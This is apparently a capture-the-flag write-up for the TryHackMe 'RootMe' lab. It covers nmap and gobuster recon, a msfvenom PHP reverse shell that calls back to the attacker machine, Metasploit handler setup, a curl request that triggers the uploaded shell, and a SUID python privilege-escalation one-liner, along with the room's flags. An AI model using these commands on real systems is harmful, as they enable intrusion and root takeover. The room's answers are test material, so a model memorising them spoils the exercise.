
---
---

<div align="center">

# TryHackMe RootMe


<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/11d59cb34397e986062eb515f4d32421.png" alt="THM RootMe" width="220px" height="220px" style="margin-right: 85px;">
<img src="https://assets.tryhackme.com/img/THMlogo.png" alt="THM Logo" width="250px" height="150px" style="margin-bottom: 50px;">

<br>

🔗 [Click here to access the TryHackMe room](https://tryhackme.com/room/rrootme)

<br>

</div>


## IP Addresses:

* ### Target/Victim Machine
	```
	10.10.188.49 (Ubuntu 18.04.4 LTS)
	```

* ### Attacker Machine
	```
	10.17.35.235 (Ubuntu 23.10)
	```


<br>

## Reconnaissance:

* ### Nmap Scan

	> nmap -sV 10.10.188.49 -o nmap.log

	```
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.6p1
	80/tcp open  http    Apache httpd 2.4.29
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	```

* ### Gobuster Scan

	> gobuster dir -u 10.10.188.49 -w ~/tools/wordlists/dirb/common.txt -o gobuster.log

	```
	/.hta                 (Status: 403) [Size: 277]
	/.htpasswd            (Status: 403) [Size: 277]
	/.htaccess            (Status: 403) [Size: 277]
	/css                  (Status: 301) [Size: 310]
	/index.php            (Status: 200) [Size: 616]
	/js                   (Status: 301) [Size: 309]
	/panel                (Status: 301) [Size: 312]
	/server-status        (Status: 403) [Size: 277]
	/uploads              (Status: 301) [Size: 314]
	```


<br>

## THM Questions (Task 1):

* _Q1_: Scan the machine, how many ports are open? <br> _A_: `2`
* _Q2_: What version of Apache is running? <br> _A_: `2.4.29`
* _Q3_: What service is running on port 22? <br> _A_: `ssh`
* _Q4_: What is the hidden directory? <br> _A_: `/panel/`


<br>

## Attempting to gain a shell:

* ### Payload creation (PHP Reverse Shell)

	> msfvenom -p php/reverse_php LHOST=tun0 LPORT=4444 -o shell.php5

* ### Listening to connection on msfconsole

	> msfconsole

	> use exploit/multi/handler

	> set payload php/reverse_php

	> set LHOST tun0

	> exploit

* ### Executing reverse shell on the server

	> curl 10.10.188.49/uploads/shell.php5


Shell obtained successfully with user `www-data`


<br>

## USER.TXT:

* ### Finding

	> find / -name user.txt 2>/dev/null

	```
	/var/www/user.txt
	```

* ### Reading

	> cat /var/www/user.txt

	```
	THM{y0u_g0t_a_sh3ll}
	```


<br>

## THM Questions (Task 2):

* _Q1_: user.txt <br> _A_: `THM{y0u_g0t_a_sh3ll}`


<br>

## Attempting privilege escalation:

* ### linPEAS.sh scan

	`/usr/bin/python` is found to be having some weird SUID permissions, and hence a potential PrivEsc vector

* ### Found Python SUID exploitation on [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid)

	> /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

Root access gained successfully!


<br>

## ROOT.TXT:

* ### Finding

	> find / -name root.txt 2>/dev/null

	```
	/root/root.txt
	```

* ### Reading

	> cat /root/root.txt

	```
	THM{pr1v1l3g3_3sc4l4t10n}
	```


<br>

## THM Questions (Task 3):

* _Q1_: Search for files with SUID permission,, which file is weird? <br> _A_: `/usr/bin/python`
* _Q2_: root.txt <br> _A_: `THM{pr1v1l3g3_3sc4l4t10n}`


<br>

---
---

<div align="center">

💻 Created by [Jayaditya Dev](https://tryhackme.com/p/jayadityadev)

🚀 Find me on [GitHub](https://github.com/jayadityadev)

</div>

---
---